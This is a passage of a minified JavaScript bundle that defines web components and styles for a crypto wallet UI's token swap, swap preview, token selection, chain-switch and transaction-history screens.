`;var mo=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let _s=class extends he{constructor(){super(),this.unsubscribe=[],this.detailsOpen=!1,this.caipNetworkId=re.state.activeCaipNetwork?.caipNetworkId,this.initialized=dt.state.initialized,this.loadingQuote=dt.state.loadingQuote,this.loadingPrices=dt.state.loadingPrices,this.loadingTransaction=dt.state.loadingTransaction,this.sourceToken=dt.state.sourceToken,this.sourceTokenAmount=dt.state.sourceTokenAmount,this.sourceTokenPriceInUSD=dt.state.sourceTokenPriceInUSD,this.toToken=dt.state.toToken,this.toTokenAmount=dt.state.toTokenAmount,this.toTokenPriceInUSD=dt.state.toTokenPriceInUSD,this.inputError=dt.state.inputError,this.gasPriceInUSD=dt.state.gasPriceInUSD,this.fetchError=dt.state.fetchError,this.onDebouncedGetSwapCalldata=ke.debounce(async()=>{await dt.swapTokens()},200),re.subscribeKey("activeCaipNetwork",e=>{this.caipNetworkId!==e?.caipNetworkId&&(this.caipNetworkId=e?.caipNetworkId,dt.resetState(),dt.initializeState())}),this.unsubscribe.push(Ut.subscribeKey("open",e=>{e||dt.resetState()}),Ee.subscribeKey("view",e=>{e.includes("Swap")||dt.resetValues()}),dt.subscribe(e=>{this.initialized=e.initialized,this.loadingQuote=e.loadingQuote,this.loadingPrices=e.loadingPrices,this.loadingTransaction=e.loadingTransaction,this.sourceToken=e.sourceToken,this.sourceTokenAmount=e.sourceTokenAmount,this.sourceTokenPriceInUSD=e.sourceTokenPriceInUSD,this.toToken=e.toToken,this.toTokenAmount=e.toTokenAmount,this.toTokenPriceInUSD=e.toTokenPriceInUSD,this.inputError=e.inputError,this.gasPriceInUSD=e.gasPriceInUSD,this.fetchError=e.fetchError}))}firstUpdated(){dt.initializeState(),this.watchTokensAndValues()}disconnectedCallback(){this.unsubscribe.forEach(e=>e?.()),clearInterval(this.interval)}render(){return F`
      <wui-flex flexDirection="column" .padding=${["0","l","l","l"]} gap="s">
        ${this.initialized?this.templateSwap():this.templateLoading()}
      </wui-flex>
    `}watchTokensAndValues(){this.interval=setInterval(()=>{dt.getNetworkTokenPrice(),dt.getMyTokensWithBalance(),dt.swapTokens()},1e4)}templateSwap(){return F`
      <wui-flex flexDirection="column" gap="s">
        <wui-flex flexDirection="column" alignItems="center" gap="xs" class="swap-inputs-container">
          ${this.templateTokenInput("sourceToken",this.sourceToken)}
          ${this.templateTokenInput("toToken",this.toToken)} ${this.templateReplaceTokensButton()}
        </wui-flex>
        ${this.templateDetails()} ${this.templateActionButton()}
      </wui-flex>
    `}actionButtonLabel(){return this.fetchError?"Swap":!this.sourceToken||!this.toToken?"Select token":this.sourceTokenAmount?this.inputError?this.inputError:"Review swap":"Enter amount"}templateReplaceTokensButton(){return F`
      <wui-flex class="replace-tokens-button-container">
        <button @click=${this.onSwitchTokens.bind(this)}>
          <wui-icon name="recycleHorizontal" color="fg-250" size="lg"></wui-icon>
        </button>
      </wui-flex>
    `}templateLoading(){return F`
      <wui-flex flexDirection="column" gap="l">
        <wui-flex flexDirection="column" alignItems="center" gap="xs" class="swap-inputs-container">
          <w3m-swap-input-skeleton target="sourceToken"></w3m-swap-input-skeleton>
          <w3m-swap-input-skeleton target="toToken"></w3m-swap-input-skeleton>
          ${this.templateReplaceTokensButton()}
        </wui-flex>
        ${this.templateActionButton()}
      </wui-flex>
    `}templateTokenInput(e,t){const i=dt.state.myTokensWithBalance?.find(a=>a?.address===t?.address),n=e==="toToken"?this.toTokenAmount:this.sourceTokenAmount,s=e==="toToken"?this.toTokenPriceInUSD:this.sourceTokenPriceInUSD,o=Tr.parseLocalStringToNumber(n)*s;return F`<w3m-swap-input
      .value=${e==="toToken"?this.toTokenAmount:this.sourceTokenAmount}
      .disabled=${e==="toToken"}
      .onSetAmount=${this.handleChangeAmount.bind(this)}
      target=${e}
      .token=${t}
      .balance=${i?.quantity?.numeric}
      .price=${i?.price}
      .marketValue=${o}
      .onSetMaxValue=${this.onSetMaxValue.bind(this)}
    ></w3m-swap-input>`}onSetMaxValue(e,t){const n=(e==="sourceToken"?this.sourceToken:this.toToken)?.address===re.getActiveNetworkTokenAddress();let s="0";if(!t){s="0",this.handleChangeAmount(e,s);return}if(!this.gasPriceInUSD){s=t,this.handleChangeAmount(e,s);return}const o=Tr.bigNumber(this.gasPriceInUSD.toFixed(5)).div(this.sourceTokenPriceInUSD),a=n?Tr.bigNumber(t).minus(o):Tr.bigNumber(t);this.handleChangeAmount(e,a.gt(0)?a.toFixed(20):"0")}templateDetails(){return!this.sourceToken||!this.toToken||this.inputError?null:F`<w3m-swap-details .detailsOpen=${this.detailsOpen}></w3m-swap-details>`}handleChangeAmount(e,t){dt.clearError(),e==="sourceToken"?dt.setSourceTokenAmount(t):dt.setToTokenAmount(t),this.onDebouncedGetSwapCalldata()}templateActionButton(){const e=!this.toToken||!this.sourceToken,t=!this.sourceTokenAmount,i=this.loadingQuote||this.loadingPrices||this.loadingTransaction,n=i||e||t||this.inputError;return F` <wui-flex gap="xs">
      <wui-button
        data-testid="swap-action-button"
        class="action-button"
        fullWidth
        size="lg"
        borderRadius="xs"
        variant=${e?"neutral":"main"}
        .loading=${i}
        .disabled=${n}
        @click=${this.onSwapPreview.bind(this)}
      >
        ${this.actionButtonLabel()}
      </wui-button>
    </wui-flex>`}onSwitchTokens(){dt.switchTokens()}onSwapPreview(){if(this.fetchError){dt.swapTokens();return}Ve.sendEvent({type:"track",event:"INITIATE_SWAP",properties:{network:this.caipNetworkId||"",swapFromToken:this.sourceToken?.symbol||"",swapToToken:this.toToken?.symbol||"",swapFromAmount:this.sourceTokenAmount||"",swapToAmount:this.toTokenAmount||"",isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT}}),Ee.push("SwapPreview")}};_s.styles=tBe;mo([te()],_s.prototype,"interval",void 0);mo([te()],_s.prototype,"detailsOpen",void 0);mo([te()],_s.prototype,"caipNetworkId",void 0);mo([te()],_s.prototype,"initialized",void 0);mo([te()],_s.prototype,"loadingQuote",void 0);mo([te()],_s.prototype,"loadingPrices",void 0);mo([te()],_s.prototype,"loadingTransaction",void 0);mo([te()],_s.prototype,"sourceToken",void 0);mo([te()],_s.prototype,"sourceTokenAmount",void 0);mo([te()],_s.prototype,"sourceTokenPriceInUSD",void 0);mo([te()],_s.prototype,"toToken",void 0);mo([te()],_s.prototype,"toTokenAmount",void 0);mo([te()],_s.prototype,"toTokenPriceInUSD",void 0);mo([te()],_s.prototype,"inputError",void 0);mo([te()],_s.prototype,"gasPriceInUSD",void 0);mo([te()],_s.prototype,"fetchError",void 0);_s=mo([me("w3m-swap-view")],_s);const rBe=ge`
  @keyframes shake {
    0% {
      transform: translateX(0);
    }
    25% {
      transform: translateX(3px);
    }
    50% {
      transform: translateX(-3px);
    }
    75% {
      transform: translateX(3px);
    }
    100% {
      transform: translateX(0);
    }
  }

  wui-flex:first-child:not(:only-child) {
    position: relative;
  }

  wui-loading-thumbnail {
    position: absolute;
  }

  wui-visual {
    width: var(--wui-wallet-image-size-lg);
    height: var(--wui-wallet-image-size-lg);
    border-radius: calc(var(--wui-border-radius-5xs) * 9 - var(--wui-border-radius-xxs));
    position: relative;
    overflow: hidden;
  }

  wui-visual::after {
    content: '';
    display: block;
    width: 100%;
    height: 100%;
    position: absolute;
    inset: 0;
    border-radius: calc(var(--wui-border-radius-5xs) * 9 - var(--wui-border-radius-xxs));
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-005);
  }

  wui-icon-box {
    position: absolute;
    right: calc(var(--wui-spacing-3xs) * -1);
    bottom: calc(var(--wui-spacing-3xs) * -1);
    opacity: 0;
    transform: scale(0.5);
    transition:
      opacity var(--wui-ease-out-power-2) var(--wui-duration-lg),
      transform var(--wui-ease-out-power-2) var(--wui-duration-lg);
    will-change: opacity, transform;
  }

  wui-text[align='center'] {
    width: 100%;
    padding: 0px var(--wui-spacing-l);
  }

  [data-error='true'] wui-icon-box {
    opacity: 1;
    transform: scale(1);
  }

  [data-error='true'] > wui-flex:first-child {
    animation: shake 250ms cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
  }

  [data-retry='false'] wui-link {
    display: none;
  }

  [data-retry='true'] wui-link {
    display: block;
    opacity: 1;
  }

  wui-link {
    padding: var(--wui-spacing-4xs) var(--wui-spacing-xxs);
  }

  .capitalize {
    text-transform: capitalize;
  }
`;var Wee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let S7=class extends he{constructor(){super(...arguments),this.unsubscribe=[],this.switchToChain=Ee.state.data?.switchToChain,this.navigateTo=Ee.state.data?.navigateTo,this.navigateWithReplace=Ee.state.data?.navigateWithReplace,this.caipNetwork=Ee.state.data?.network,this.activeChain=re.state.activeChain}firstUpdated(){this.unsubscribe.push(re.subscribeKey("activeChain",e=>this.activeChain=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=this.switchToChain?Me.CHAIN_NAME_MAP[this.switchToChain]:"supported";if(!this.switchToChain)return null;const t=this.switchToChain==="eip155"?"Ethereum":this.switchToChain;return F`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        .padding=${["3xl","xl","xl","xl"]}
        gap="xl"
      >
        <wui-flex justifyContent="center" flexDirection="column" alignItems="center" gap="xl">
          <wui-visual
            name=${this.switchToChain==="eip155"?"eth":this.switchToChain}
          ></wui-visual>
          <wui-text
            data-testid=${`w3m-switch-active-chain-to-${t}`}
            variant="paragraph-500"
            color="fg-100"
            align="center"
            >Switch to <span class="capitalize">${t}</span></wui-text
          >
          <wui-text variant="small-400" color="fg-200" align="center">
            Connected wallet doesn't support connecting to ${e} chain. You
            need to connect with a different wallet.
          </wui-text>
          <wui-button
            data-testid="w3m-switch-active-chain-button"
            size="md"
            @click=${this.switchActiveChain.bind(this)}
            >Switch</wui-button
          >
        </wui-flex>
      </wui-flex>
    `}async switchActiveChain(){this.switchToChain&&(re.setIsSwitchingNamespace(!0),Xe.setFilterByNamespace(this.switchToChain),this.caipNetwork?await re.switchActiveNetwork(this.caipNetwork):re.setActiveNamespace(this.switchToChain),Ee.reset("Connect"))}};S7.styles=rBe;Wee([V()],S7.prototype,"activeChain",void 0);S7=Wee([me("w3m-switch-active-chain-view")],S7);const iBe=ge`
  :host > wui-flex:first-child {
    overflow-y: auto;
    overflow-x: hidden;
    scrollbar-width: none;
  }

  :host > wui-flex:first-child::-webkit-scrollbar {
    display: none;
  }

  .preview-container,
  .details-container {
    width: 100%;
  }

  .token-image {
    width: 24px;
    height: 24px;
    box-shadow: 0 0 0 2px var(--wui-color-gray-glass-005);
    border-radius: 12px;
  }

  wui-loading-hexagon {
    position: absolute;
  }

  .token-item {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: var(--wui-spacing-xxs);
    padding: var(--wui-spacing-xs);
    height: 40px;
    border: none;
    border-radius: 80px;
    background: var(--wui-color-gray-glass-002);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-002);
    cursor: pointer;
    transition: background 0.2s linear;
  }

  .token-item:hover {
    background: var(--wui-color-gray-glass-005);
  }

  .preview-token-details-container {
    width: 100%;
  }

  .details-row {
    width: 100%;
    padding: var(--wui-spacing-s) var(--wui-spacing-xl);
    border-radius: var(--wui-border-radius-xxs);
    background: var(--wui-color-gray-glass-002);
  }

  .action-buttons-container {
    width: 100%;
    gap: var(--wui-spacing-xs);
  }

  .action-buttons-container > button {
    display: flex;
    align-items: center;
    justify-content: center;
    background: transparent;
    height: 48px;
    border-radius: var(--wui-border-radius-xs);
    border: none;
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }

  .action-buttons-container > button:disabled {
    opacity: 0.8;
    cursor: not-allowed;
  }

  .action-button > wui-loading-spinner {
    display: inline-block;
  }

  .cancel-button:hover,
  .action-button:hover {
    cursor: pointer;
  }

  .action-buttons-container > wui-button.cancel-button {
    flex: 2;
  }

  .action-buttons-container > wui-button.action-button {
    flex: 4;
  }

  .action-buttons-container > button.action-button > wui-text {
    color: white;
  }

  .details-container > wui-flex {
    background: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xxs);
    width: 100%;
  }

  .details-container > wui-flex > button {
    border: none;
    background: none;
    padding: var(--wui-spacing-s);
    border-radius: var(--wui-border-radius-xxs);
    transition: background 0.2s linear;
  }

  .details-container > wui-flex > button:hover {
    background: var(--wui-color-gray-glass-002);
  }

  .details-content-container {
    padding: var(--wui-spacing-1xs);
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .details-content-container > wui-flex {
    width: 100%;
  }

  .details-row {
    width: 100%;
    padding: var(--wui-spacing-s) var(--wui-spacing-xl);
    border-radius: var(--wui-border-radius-xxs);
    background: var(--wui-color-gray-glass-002);
  }
`;var Is=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let rs=class extends he{constructor(){super(),this.unsubscribe=[],this.detailsOpen=!0,this.approvalTransaction=dt.state.approvalTransaction,this.swapTransaction=dt.state.swapTransaction,this.sourceToken=dt.state.sourceToken,this.sourceTokenAmount=dt.state.sourceTokenAmount??"",this.sourceTokenPriceInUSD=dt.state.sourceTokenPriceInUSD,this.toToken=dt.state.toToken,this.toTokenAmount=dt.state.toTokenAmount??"",this.toTokenPriceInUSD=dt.state.toTokenPriceInUSD,this.caipNetwork=re.state.activeCaipNetwork,this.balanceSymbol=Se.state.balanceSymbol,this.gasPriceInUSD=dt.state.gasPriceInUSD,this.inputError=dt.state.inputError,this.loadingQuote=dt.state.loadingQuote,this.loadingApprovalTransaction=dt.state.loadingApprovalTransaction,this.loadingBuildTransaction=dt.state.loadingBuildTransaction,this.loadingTransaction=dt.state.loadingTransaction,this.unsubscribe.push(Se.subscribeKey("balanceSymbol",e=>{this.balanceSymbol!==e&&Ee.goBack()}),re.subscribeKey("activeCaipNetwork",e=>{this.caipNetwork!==e&&(this.caipNetwork=e)}),dt.subscribe(e=>{this.approvalTransaction=e.approvalTransaction,this.swapTransaction=e.swapTransaction,this.sourceToken=e.sourceToken,this.gasPriceInUSD=e.gasPriceInUSD,this.toToken=e.toToken,this.gasPriceInUSD=e.gasPriceInUSD,this.toTokenPriceInUSD=e.toTokenPriceInUSD,this.sourceTokenAmount=e.sourceTokenAmount??"",this.toTokenAmount=e.toTokenAmount??"",this.inputError=e.inputError,e.inputError&&Ee.goBack(),this.loadingQuote=e.loadingQuote,this.loadingApprovalTransaction=e.loadingApprovalTransaction,this.loadingBuildTransaction=e.loadingBuildTransaction,this.loadingTransaction=e.loadingTransaction}))}firstUpdated(){dt.getTransaction(),this.refreshTransaction()}disconnectedCallback(){this.unsubscribe.forEach(e=>e?.()),clearInterval(this.interval)}render(){return F`
      <wui-flex flexDirection="column" .padding=${["0","l","l","l"]} gap="s">
        ${this.templateSwap()}
      </wui-flex>
    `}refreshTransaction(){this.interval=setInterval(()=>{dt.getApprovalLoadingState()||dt.getTransaction()},1e4)}templateSwap(){const e=`${Wt.formatNumberToLocalString(parseFloat(this.sourceTokenAmount))} ${this.sourceToken?.symbol}`,t=`${Wt.formatNumberToLocalString(parseFloat(this.toTokenAmount))} ${this.toToken?.symbol}`,i=parseFloat(this.sourceTokenAmount)*this.sourceTokenPriceInUSD,n=parseFloat(this.toTokenAmount)*this.toTokenPriceInUSD-(this.gasPriceInUSD||0),s=Wt.formatNumberToLocalString(i),o=Wt.formatNumberToLocalString(n),a=this.loadingQuote||this.loadingBuildTransaction||this.loadingTransaction||this.loadingApprovalTransaction;return F`
      <wui-flex flexDirection="column" alignItems="center" gap="l">
        <wui-flex class="preview-container" flexDirection="column" alignItems="flex-start" gap="l">
          <wui-flex
            class="preview-token-details-container"
            alignItems="center"
            justifyContent="space-between"
            gap="l"
          >
            <wui-flex flexDirection="column" alignItems="flex-start" gap="4xs">
              <wui-text variant="small-400" color="fg-150">Send</wui-text>
              <wui-text variant="paragraph-400" color="fg-100">$${s}</wui-text>
            </wui-flex>
            <wui-token-button
              flexDirection="row-reverse"
              text=${e}
              imageSrc=${this.sourceToken?.logoUri}
            >
            </wui-token-button>
          </wui-flex>
          <wui-icon name="recycleHorizontal" color="fg-200" size="md"></wui-icon>
          <wui-flex
            class="preview-token-details-container"
            alignItems="center"
            justifyContent="space-between"
            gap="l"
          >
            <wui-flex flexDirection="column" alignItems="flex-start" gap="4xs">
              <wui-text variant="small-400" color="fg-150">Receive</wui-text>
              <wui-text variant="paragraph-400" color="fg-100">$${o}</wui-text>
            </wui-flex>
            <wui-token-button
              flexDirection="row-reverse"
              text=${t}
              imageSrc=${this.toToken?.logoUri}
            >
            </wui-token-button>
          </wui-flex>
        </wui-flex>

        ${this.templateDetails()}

        <wui-flex flexDirection="row" alignItems="center" justifyContent="center" gap="xs">
          <wui-icon size="sm" color="fg-200" name="infoCircle"></wui-icon>
          <wui-text variant="small-400" color="fg-200">Review transaction carefully</wui-text>
        </wui-flex>

        <wui-flex
          class="action-buttons-container"
          flexDirection="row"
          alignItems="center"
          justifyContent="space-between"
          gap="xs"
        >
          <wui-button
            class="cancel-button"
            fullWidth
            size="lg"
            borderRadius="xs"
            variant="neutral"
            @click=${this.onCancelTransaction.bind(this)}
          >
            <wui-text variant="paragraph-600" color="fg-200">Cancel</wui-text>
          </wui-button>
          <wui-button
            class="action-button"
            fullWidth
            size="lg"
            borderRadius="xs"
            variant="main"
            ?loading=${a}
            ?disabled=${a}
            @click=${this.onSendTransaction.bind(this)}
          >
            <wui-text variant="paragraph-600" color="inverse-100">
              ${this.actionButtonLabel()}
            </wui-text>
          </wui-button>
        </wui-flex>
      </wui-flex>
    `}templateDetails(){return!this.sourceToken||!this.toToken||this.inputError?null:F`<w3m-swap-details .detailsOpen=${this.detailsOpen}></w3m-swap-details>`}actionButtonLabel(){return this.loadingApprovalTransaction?"Approving...":this.approvalTransaction?"Approve":"Swap"}onCancelTransaction(){Ee.goBack()}onSendTransaction(){this.approvalTransaction?dt.sendTransactionForApproval(this.approvalTransaction):dt.sendTransactionForSwap(this.swapTransaction)}};rs.styles=iBe;Is([te()],rs.prototype,"interval",void 0);Is([te()],rs.prototype,"detailsOpen",void 0);Is([te()],rs.prototype,"approvalTransaction",void 0);Is([te()],rs.prototype,"swapTransaction",void 0);Is([te()],rs.prototype,"sourceToken",void 0);Is([te()],rs.prototype,"sourceTokenAmount",void 0);Is([te()],rs.prototype,"sourceTokenPriceInUSD",void 0);Is([te()],rs.prototype,"toToken",void 0);Is([te()],rs.prototype,"toTokenAmount",void 0);Is([te()],rs.prototype,"toTokenPriceInUSD",void 0);Is([te()],rs.prototype,"caipNetwork",void 0);Is([te()],rs.prototype,"balanceSymbol",void 0);Is([te()],rs.prototype,"gasPriceInUSD",void 0);Is([te()],rs.prototype,"inputError",void 0);Is([te()],rs.prototype,"loadingQuote",void 0);Is([te()],rs.prototype,"loadingApprovalTransaction",void 0);Is([te()],rs.prototype,"loadingBuildTransaction",void 0);Is([te()],rs.prototype,"loadingTransaction",void 0);rs=Is([me("w3m-swap-preview-view")],rs);const nBe=ge`
  :host {
    --tokens-scroll--top-opacity: 0;
    --tokens-scroll--bottom-opacity: 1;
    --suggested-tokens-scroll--left-opacity: 0;
    --suggested-tokens-scroll--right-opacity: 1;
  }

  :host > wui-flex:first-child {
    overflow-y: hidden;
    overflow-x: hidden;
    scrollbar-width: none;
    scrollbar-height: none;
  }

  :host > wui-flex:first-child::-webkit-scrollbar {
    display: none;
  }

  wui-loading-hexagon {
    position: absolute;
  }

  .suggested-tokens-container {
    overflow-x: auto;
    mask-image: linear-gradient(
      to right,
      rgba(0, 0, 0, calc(1 - var(--suggested-tokens-scroll--left-opacity))) 0px,
      rgba(200, 200, 200, calc(1 - var(--suggested-tokens-scroll--left-opacity))) 1px,
      black 50px,
      black 90px,
      black calc(100% - 90px),
      black calc(100% - 50px),
      rgba(155, 155, 155, calc(1 - var(--suggested-tokens-scroll--right-opacity))) calc(100% - 1px),
      rgba(0, 0, 0, calc(1 - var(--suggested-tokens-scroll--right-opacity))) 100%
    );
  }

  .suggested-tokens-container::-webkit-scrollbar {
    display: none;
  }

  .tokens-container {
    border-top: 1px solid var(--wui-color-gray-glass-005);
    height: 100%;
    max-height: 390px;
  }

  .tokens {
    width: 100%;
    overflow-y: auto;
    mask-image: linear-gradient(
      to bottom,
      rgba(0, 0, 0, calc(1 - var(--tokens-scroll--top-opacity))) 0px,
      rgba(200, 200, 200, calc(1 - var(--tokens-scroll--top-opacity))) 1px,
      black 50px,
      black 90px,
      black calc(100% - 90px),
      black calc(100% - 50px),
      rgba(155, 155, 155, calc(1 - var(--tokens-scroll--bottom-opacity))) calc(100% - 1px),
      rgba(0, 0, 0, calc(1 - var(--tokens-scroll--bottom-opacity))) 100%
    );
  }

  .network-search-input,
  .select-network-button {
    height: 40px;
  }

  .select-network-button {
    border: none;
    display: flex;
    flex-direction: row;
    align-items: center;
    justify-content: center;
    gap: var(--wui-spacing-xs);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-005);
    background-color: transparent;
    border-radius: var(--wui-border-radius-xxs);
    padding: var(--wui-spacing-xs);
    align-items: center;
    transition: background-color 0.2s linear;
  }

  .select-network-button:hover {
    background-color: var(--wui-color-gray-glass-002);
  }

  .select-network-button > wui-image {
    width: 26px;
    height: 26px;
    border-radius: var(--wui-border-radius-xs);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }
`;var M0=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let xu=class extends he{constructor(){super(),this.unsubscribe=[],this.targetToken=Ee.state.data?.target,this.sourceToken=dt.state.sourceToken,this.sourceTokenAmount=dt.state.sourceTokenAmount,this.toToken=dt.state.toToken,this.myTokensWithBalance=dt.state.myTokensWithBalance,this.popularTokens=dt.state.popularTokens,this.searchValue="",this.unsubscribe.push(dt.subscribe(e=>{this.sourceToken=e.sourceToken,this.toToken=e.toToken,this.myTokensWithBalance=e.myTokensWithBalance}))}updated(){this.renderRoot?.querySelector(".suggested-tokens-container")?.addEventListener("scroll",this.handleSuggestedTokensScroll.bind(this)),this.renderRoot?.querySelector(".tokens")?.addEventListener("scroll",this.handleTokenListScroll.bind(this))}disconnectedCallback(){super.disconnectedCallback();const e=this.renderRoot?.querySelector(".suggested-tokens-container"),t=this.renderRoot?.querySelector(".tokens");e?.removeEventListener("scroll",this.handleSuggestedTokensScroll.bind(this)),t?.removeEventListener("scroll",this.handleTokenListScroll.bind(this)),clearInterval(this.interval)}render(){return F`
      <wui-flex flexDirection="column" gap="s">
        ${this.templateSearchInput()} ${this.templateSuggestedTokens()} ${this.templateTokens()}
      </wui-flex>
    `}onSelectToken(e){this.targetToken==="sourceToken"?dt.setSourceToken(e):(dt.setToToken(e),this.sourceToken&&this.sourceTokenAmount&&dt.swapTokens()),Ee.goBack()}templateSearchInput(){return F`
      <wui-flex .padding=${["3xs","s","0","s"]} gap="xs">
        <wui-input-text
          data-testid="swap-select-token-search-input"
          class="network-search-input"
          size="sm"
          placeholder="Search token"
          icon="search"
          .value=${this.searchValue}
          @inputChange=${this.onSearchInputChange.bind(this)}
        ></wui-input-text>
      </wui-flex>
    `}templateTokens(){const e=this.myTokensWithBalance?Object.values(this.myTokensWithBalance):[],t=this.popularTokens?this.popularTokens:[],i=this.filterTokensWithText(e,this.searchValue),n=this.filterTokensWithText(t,this.searchValue);return F`
      <wui-flex class="tokens-container">
        <wui-flex class="tokens" .padding=${["0","s","s","s"]} flexDirection="column">
          ${i?.length>0?F`
                <wui-flex justifyContent="flex-start" padding="s">
                  <wui-text variant="paragraph-500" color="fg-200">Your tokens</wui-text>
                </wui-flex>
                ${i.map(s=>{const o=s.symbol===this.sourceToken?.symbol||s.symbol===this.toToken?.symbol;return F`
                    <wui-token-list-item
                      data-testid="swap-select-token-item-${s.symbol}"
                      name=${s.name}
                      ?disabled=${o}
                      symbol=${s.symbol}
                      price=${s?.price}
                      amount=${s?.quantity?.numeric}
                      imageSrc=${s.logoUri}
                      @click=${()=>{o||this.onSelectToken(s)}}
                    >
                    </wui-token-list-item>
                  `})}
              `:null}

          <wui-flex justifyContent="flex-start" padding="s">
            <wui-text variant="paragraph-500" color="fg-200">Tokens</wui-text>
          </wui-flex>
          ${n?.length>0?n.map(s=>F`
                  <wui-token-list-item
                    data-testid="swap-select-token-item-${s.symbol}"
                    name=${s.name}
                    symbol=${s.symbol}
                    imageSrc=${s.logoUri}
                    @click=${()=>this.onSelectToken(s)}
                  >
                  </wui-token-list-item>
                `):null}
        </wui-flex>
      </wui-flex>
    `}templateSuggestedTokens(){const e=dt.state.suggestedTokens?dt.state.suggestedTokens.slice(0,8):null;return e?F`
      <wui-flex class="suggested-tokens-container" .padding=${["0","s","0","s"]} gap="xs">
        ${e.map(t=>F`
            <wui-token-button
              text=${t.symbol}
              imageSrc=${t.logoUri}
              @click=${()=>this.onSelectToken(t)}
            >
            </wui-token-button>
          `)}
      </wui-flex>
    `:null}onSearchInputChange(e){this.searchValue=e.detail}handleSuggestedTokensScroll(){const e=this.renderRoot?.querySelector(".suggested-tokens-container");e&&(e.style.setProperty("--suggested-tokens-scroll--left-opacity",C1.interpolate([0,100],[0,1],e.scrollLeft).toString()),e.style.setProperty("--suggested-tokens-scroll--right-opacity",C1.interpolate([0,100],[0,1],e.scrollWidth-e.scrollLeft-e.offsetWidth).toString()))}handleTokenListScroll(){const e=this.renderRoot?.querySelector(".tokens");e&&(e.style.setProperty("--tokens-scroll--top-opacity",C1.interpolate([0,100],[0,1],e.scrollTop).toString()),e.style.setProperty("--tokens-scroll--bottom-opacity",C1.interpolate([0,100],[0,1],e.scrollHeight-e.scrollTop-e.offsetHeight).toString()))}filterTokensWithText(e,t){return e.filter(i=>`${i.symbol} ${i.name} ${i.address}`.toLowerCase().includes(t.toLowerCase()))}};xu.styles=nBe;M0([te()],xu.prototype,"interval",void 0);M0([te()],xu.prototype,"targetToken",void 0);M0([te()],xu.prototype,"sourceToken",void 0);M0([te()],xu.prototype,"sourceTokenAmount",void 0);M0([te()],xu.prototype,"toToken",void 0);M0([te()],xu.prototype,"myTokensWithBalance",void 0);M0([te()],xu.prototype,"popularTokens",void 0);M0([te()],xu.prototype,"searchValue",void 0);xu=M0([me("w3m-swap-select-token-view")],xu);const sBe=ge`
  :host > wui-flex:first-child {
    height: 500px;
    overflow-y: auto;
    overflow-x: hidden;
    scrollbar-width: none;
  }

  :host > wui-flex:first-child::-webkit-scrollbar {
    display: none;
  }
`;var oBe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Vk=class extends he{render(){return F`
      <wui-flex flexDirection="column" .padding=${["0","m","m","m"]} gap="s">
        <w3m-activity-list page="activity"></w3m-activity-list>
      </wui-flex>
    `}};Vk.styles=sBe;Vk=oBe([me("w3m-transactions-view")],Vk);var aBe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const cBe=[{images:["network","layers","system"],title:"The systems nuts and bolts",text:"A network is what brings the blockchain to life, as this technical infrastructure allows apps to access the ledger and smart contract services."},{images:["noun","defiAlt","dao"],title:"Designed for different uses",text:"Each network is designed differently, and may therefore suit certain apps and experiences."}];let Kq=class extends he{render(){return F`
      <wui-flex
        flexDirection="column"
        .padding=${["xxl","xl","xl","xl"]}
        alignItems="center"
        gap="xl"
      >
        <w3m-help-widget .data=${cBe}></w3m-help-widget>
        <wui-button
          variant="main"
          size="md"
          @click=${()=>{ke.openHref("https://ethereum.org/en/developers/docs/networks/","_blank")}}
        >
          Learn more
          <wui-icon color="inherit" slot="iconRight" name="externalLink"></wui-icon>
        </wui-button>
      </wui-flex>
